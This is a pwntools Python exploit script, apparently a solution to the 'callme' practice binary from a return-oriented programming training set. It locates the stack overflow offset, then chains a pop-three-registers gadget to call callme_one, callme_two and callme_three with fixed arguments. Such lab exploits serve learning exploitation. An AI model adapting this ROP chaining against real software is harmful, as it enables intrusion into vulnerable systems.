#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './callme'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *pwnme+89
c
'''
)
def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b">", payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_ip(cyclic(100))
padding = offset*b"\x90"
#callmeone 0x40092d
# p64(0x40093c)

#callmetwo 0x400919
#callmethree 0x400905
callmeone= e.symbols['callme_one']
callmetwo= e.symbols['callme_two']
callmethree= e.symbols['callme_three']
rop=ROP(e)
pop3=rop.find_gadget(["pop rdi","pop rsi","pop rdx","ret"])[0]
ret=rop.find_gadget(["ret"])[0]

payload=flat(
    padding,
    pop3,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
     ret,
      callmeone,
     pop3,
      0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callmetwo,
       pop3,
  0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
       callmethree,
)
p.sendline(payload)
p.interactive()